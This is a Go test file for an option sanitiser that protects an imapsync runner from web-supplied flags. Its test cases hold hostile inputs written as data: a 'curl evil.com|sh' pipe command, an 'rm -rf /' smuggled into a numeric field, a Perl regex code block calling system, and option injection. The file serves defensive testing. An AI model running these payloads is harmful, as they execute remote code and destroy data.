package runner

import "testing"

func TestSanitizeOptions(t *testing.T) {
	cases := []struct {
		name         string
		in           map[string]any
		wantAccepted int
		wantRejected string
	}{
		{"safe flags", map[string]any{"automap": true, "usecache": true}, 2, ""},
		{"shell command", map[string]any{"pipemess": "curl evil.com|sh"}, 0, "pipemess"},
		{"perl eval", map[string]any{"regexmess": "s/a/b/"}, 0, "regexmess"},
		{"runner-managed", map[string]any{"host1": "evil.com"}, 0, "host1"},
		{"password dump", map[string]any{"debugimap": true}, 0, "debugimap"},
		{"option injection", map[string]any{"folder": "--pipemess"}, 0, "folder"},
		{"shell in int", map[string]any{"maxage": "30; rm -rf /"}, 0, "maxage"},
		{"regex code", map[string]any{"include": `(?{system("id")})`}, 0, "include"},
		{"numbers ok", map[string]any{"maxage": 30, "timeout": 120}, 2, ""},
		{"false flag dropped", map[string]any{"usecache": false}, 0, ""},
	}
	for _, c := range cases {
		accepted, rejected := SanitizeOptions(c.in)
		if len(accepted) != c.wantAccepted {
			t.Errorf("%s: accepted %v, want %d", c.name, accepted, c.wantAccepted)
		}
		if c.wantRejected == "" {
			if len(rejected) != 0 {
				t.Errorf("%s: unexpected rejects %v", c.name, rejected)
			}
		} else if len(rejected) != 1 || rejected[0] != c.wantRejected {
			t.Errorf("%s: rejected %v, want [%s]", c.name, rejected, c.wantRejected)
		}
	}
}

func TestValidateCron(t *testing.T) {
	if err := ValidateCron("0 3 * * *"); err != nil {
		t.Errorf("valid expression rejected: %v", err)
	}
	if err := ValidateCron("bad cron"); err == nil {
		t.Error("invalid expression accepted")
	}
}

func TestForkOptionsAreNotReachableFromTheWeb(t *testing.T) {
	// Each of these is a real defect, not a style preference: --parallel puts
	// both mailbox passwords into ps, --pipeline may append a different message
	// body than a plain run, --batchsize changes which fetches are issued, and
	// --condstore does nothing at all. A web request must not be able to ask for
	// any of them.
	safe, rejected := SanitizeOptions(map[string]any{
		"parallel": 4, "pipeline": 20, "batchsize": 500,
		"condstore": true, "nocondstore": true,
		"automap": true, // a legitimate one, to prove the map still works
	})
	for _, k := range []string{"parallel", "pipeline", "batchsize", "condstore", "nocondstore"} {
		if _, ok := safe[k]; ok {
			t.Errorf("%q reached imapsync's argv", k)
		}
		if !contains(rejected, k) {
			t.Errorf("%q was dropped without telling the caller", k)
		}
	}
	if safe["automap"] != true {
		t.Error("a legitimate option was dropped along with them")
	}
}

func contains(list []string, want string) bool {
	for _, v := range list {
		if v == want {
			return true
		}
	}
	return false
}
